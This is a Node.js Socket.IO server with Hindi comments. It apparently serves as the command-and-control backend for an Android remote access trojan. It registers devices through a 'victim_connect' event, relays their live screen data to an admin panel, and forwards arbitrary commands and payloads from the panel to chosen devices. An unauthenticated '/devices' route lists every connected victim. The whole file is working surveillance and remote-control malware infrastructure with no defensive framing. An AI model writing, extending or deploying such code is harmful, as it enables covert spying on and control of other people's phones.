const express = require('express');
const http = require('http');
const path = require('path');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
    }
});

const PORT = process.env.PORT || 8080;

// --- डेटा स्टोरेज (अस्थायी) ---
let adminSocket = null;
let devices = {}; // कनेक्टेड डिवाइस यहाँ स्टोर होते हैं

// --- सर्वर को शुरू करना ---
server.listen(PORT, () => {
    console.log(`सर्वर पोर्ट ${PORT} पर चल रहा है...`);
});

// --- वेब रूट्स ---
// मुख्य पैनल पेज
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

// ===== नया डीबगिंग रूट =====
// कनेक्टेड डिवाइस की रॉ JSON सूची देखने के लिए
app.get('/devices', (req, res) => {
    res.json({
        connected_devices_count: Object.keys(devices).length,
        devices: Object.values(devices)
    });
});
// ===========================

// --- Socket.IO कनेक्शन लॉजिक ---
io.on('connection', (socket) => {
    console.log(`एक क्लाइंट कनेक्ट हुआ: ${socket.id}`);

    // ... (बाकी का पूरा कोड जैसा पहले था वैसा ही रहेगा) ...

    // ==================================================
    // 1. पैनल (एडमिन) से आने वाले इवेंट्स
    // ==================================================
    socket.on('admin_join', () => {
        console.log(`पैनल (एडमिन) कनेक्ट हुआ: ${socket.id}`);
        adminSocket = socket;
        socket.emit('device_list', Object.values(devices));
    });

    socket.on('command_to_device', (data) => {
        const { deviceId, action, payload } = data;
        const targetDevice = devices[deviceId];
        if (targetDevice && targetDevice.socketId) {
            console.log(`डिवाइस ${deviceId} को कमांड भेजा जा रहा है: ${action}`);
            io.to(targetDevice.socketId).emit(action, payload);
        } else {
            console.log(`कमांड भेजने में विफल: डिवाइस ${deviceId} नहीं मिला.`);
        }
    });

    // ==================================================
    // 2. डिवाइस (APK) से आने वाले इवेंट्स
    // ==================================================
    socket.on('victim_connect', (deviceInfo) => {
        console.log('नया डिवाइस कनेक्ट हुआ:', deviceInfo);
        devices[deviceInfo.deviceId] = {
            ...deviceInfo,
            socketId: socket.id
        };
        if (adminSocket) {
            adminSocket.emit('new_device_joined', devices[deviceInfo.deviceId]);
        }
    });

    socket.on('screen_data', (data) => {
        if (adminSocket) {
            adminSocket.emit('screen_update', data);
        }
    });

    // ==================================================
    // 3. डिस्कनेक्शन हैंडलिंग
    // ==================================================
    socket.on('disconnect', () => {
        console.log(`क्लाइंट डिस्कनेक्ट हो गया: ${socket.id}`);
        if (adminSocket && socket.id === adminSocket.id) {
            adminSocket = null;
            console.log('पैनल (एडमिन) डिस्कनेक्ट हो गया.');
        } else {
            let disconnectedDeviceId = null;
            for (const deviceId in devices) {
                if (devices[deviceId].socketId === socket.id) {
                    disconnectedDeviceId = deviceId;
                    break;
                }
            }
            if (disconnectedDeviceId) {
                console.log(`डिवाइस ${disconnectedDeviceId} डिस्कनेक्ट हो गया.`);
                delete devices[disconnectedDeviceId];
                if (adminSocket) {
                    adminSocket.emit('device_disconnected', disconnectedDeviceId);
                }
            }
        }
    });
});
